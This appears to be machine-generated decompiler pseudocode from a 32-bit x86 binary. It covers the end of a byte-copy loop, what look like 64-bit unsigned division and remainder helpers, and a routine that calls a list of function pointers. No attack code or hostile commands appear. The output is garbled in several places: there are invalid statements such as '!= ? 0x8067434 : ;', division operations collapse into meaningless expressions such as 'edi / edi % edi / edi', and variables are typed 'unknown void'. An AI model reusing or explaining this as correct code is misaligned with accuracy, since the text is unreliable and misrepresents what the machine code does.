        eax = eax + 4;
        dl = *(eax + ecx);
        *eax = dl;
        if(*eax == 0) {
            goto L08067340;
        }
        dl = *(eax + ecx + 1);
        *(eax + 1) = dl;
        if(*(eax + 1) == 0) {
            goto L0806733f;
        }
        dl = *(eax + ecx + 2);
        *(eax + 2) = dl;
        if(*(eax + 2) == 0) {
            goto L0806733e;
        }
        dl = *(eax + ecx + 3);
        *(eax + 3) = dl;
    } while(*(eax + 3) != 0);
    eax = eax + 1;
L0806733e:
    eax = eax + 1;
L0806733f:
    eax = eax + 1;
L08067340:
}


L08067344(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    eax = A10;
    Vffffffe4 = eax;
    edi = A14;
    Vfffffffc = A8;
    ebx = Ac;
    if(edi == 0) {
        if(eax > ebx) {
            edx = ebx;
            Vffffffe4 = Vffffffe4 / Vffffffe4;
            edx = Vffffffe4 % Vffffffe4;
            edi = Vfffffffc;
            goto L08067434;
        }
        if(Vffffffe4 == 0) {
            edx = 0;
            Vffffffe4 = Vffffffe4 / Vffffffe4;
            edx = Vffffffe4 % Vffffffe4;
            Vffffffe4 = 1;
        }
        eax = ebx;
        edx = 0;
        Vffffffe4 = Vffffffe4 / Vffffffe4;
        ebx = Vffffffe4 % Vffffffe4;
        esi = eax;
        Vffffffe4 = Vffffffe4 / Vffffffe4;
        edx = Vffffffe4 % Vffffffe4;
        edi = Vfffffffc;
    } else {
        if(edi > ebx) {
L080673ac:
            edi = 0;
        } else {
            asm("bsr edx,edi");
            dl = dl ^ 31;
            Vffffffdc = edx;
            if(Vffffffdc == 0) {
                if(ebx <= edi && Vfffffffc < Vffffffe4) {
                    goto L080673ac;
                }
                edi = 1;
            } else {
                esi = 32 - Vffffffdc;
                ecx = Vffffffdc;
                edi = edi << cl;
                Vfffffff8 = edi;
                ecx = esi;
                edi = Vfffffff8 | Vffffffe4 >> cl;
                ecx = Vffffffdc;
                Vffffffe4 = Vffffffe4 << cl;
                eax = ebx;
                ecx = esi;
                Vfffffff4 = eax >> cl;
                ecx = Vffffffdc;
                ebx = ebx << cl;
                Vfffffff0 = ebx;
                ecx = esi;
                ebx = Vfffffff0 | Vfffffffc >> cl;
                Vfffffffc = Vfffffffc << Vffffffdc;
                eax = ebx;
                edx = Vfffffff4;
                edx = edi / edi % edi / edi;
                ebx = edx;
                edi = eax;
                eax = Vffffffe4;
                asm("mul edi");
                Vffffffdc = edx;
                esi = eax;
                if(edx > ebx) {
                    goto L08067433;
                }
                != ? 0x8067434 : ;
                if(Vfffffffc < esi) {
L08067433:
                    edi = edi - 1;
                }
            }
        }
L08067434:
        esi = 0;
    }
    Vffffffe8 = edi;
    Vffffffec = esi;
    edx = Vffffffec;
    esp = ebp - 48;
    return(Vffffffe8);
}


L0806744C(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffffd8;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    edi = A10;
    ebx = A14;
    esi = A8;
    eax = Ac;
    Vffffffe0 = eax;
    if(ebx == 0) {
        if(edi > eax) {
            eax = esi;
            edx = Vffffffe0;
            edx = edi / edi % edi / edi;
        } else {
            if(edi == 0) {
                edx = 0;
                edx = edi / edi % edi / edi;
                edi = 1;
            }
            eax = Vffffffe0;
            edx = 0;
            edi = edi / edi;
            Vffffffe0 = edi % edi;
            eax = esi;
            edx = edi / edi % edi / edi;
        }
        Vfffffff0 = edx;
        Vfffffff4 = 0;
    } else {
        if(Vffffffe0 >= ebx) {
            asm("bsr edx,ebx");
            dl = dl ^ 31;
            Vffffffec = edx;
            if(Vffffffec != 0) {
                goto L080674e8;
            }
            if(Vffffffe0 > ebx) {
                goto L080674c3;
            }
            if(esi >= edi) {
L080674c3:
                edx = Vffffffe0;
                esi = esi - edi;
                asm("sbb edx,ebx");
                Vffffffe0 = edx;
            }
        }
        Vfffffff0 = esi;
        Vfffffff4 = Vffffffe0;
        Vfffffff8 = Vfffffff0;
        Vfffffffc = Vfffffff4;
        goto L08067598;
L080674e8:
        edx = 32 - Vffffffec;
        Vffffffe8 = edx;
        ecx = Vffffffec;
        ebx = ebx << cl;
        Vffffffd8 = ebx;
        eax = edi;
        ecx = edx;
        ebx = Vffffffd8 | eax >> cl;
        ecx = Vffffffec;
        edi = edi << cl;
        ecx = edx;
        Vffffffe4 = Vffffffe0 >> cl;
        ecx = Vffffffec;
        Vffffffd8 = Vffffffe0 << cl;
        eax = esi;
        ecx = edx;
        eax = eax >> cl;
        Vffffffe0 = Vffffffd8 | eax;
        ecx = Vffffffec;
        esi = esi << cl;
        eax = Vffffffe0;
        edx = Vffffffe4;
        edx = ebx / ebx % ebx / ebx;
        Vffffffe0 = edx;
        Vffffffd8 = eax;
        asm("mul edi");
        Vffffffdc = edx;
        Vffffffd8 = eax;
        if(edx <= Vffffffe0) {
            != ? 0x8067563 : ;
            if(eax <= esi) {
                goto L08067563;
            }
        }
        eax = Vffffffdc;
        edx = Vffffffd8 - edi;
        asm("sbb eax,ebx");
        Vffffffd8 = edx;
        Vffffffdc = eax;
L08067563:
        ecx = Vffffffe0;
        esi = esi - Vffffffd8;
        asm("sbb ecx,[ebp-0x24]");
        Vffffffe0 = ecx;
        ecx = Vffffffe8;
        eax = Vffffffe0 << cl;
        ecx = Vffffffec;
        esi = esi >> cl;
        Vffffffdc = esi;
        Vfffffff0 = eax | Vffffffdc;
        Vfffffff4 = Vffffffe0 >> cl;
    }
    Vfffffff8 = Vfffffff0;
    Vfffffffc = Vfffffff4;
L08067598:
    edx = Vfffffffc;
    esp = ebp - 52;
    return(Vfffffff8);
}


L080675A8()
{
	/* unknown */ void  ebx;



    ebx = 134714028;
    if(*L080792AC != -1) {
        do {
            eax = *( *ebx)();
            ebx = ebx + -4;
        } while(*ebx != -1);
    }
}




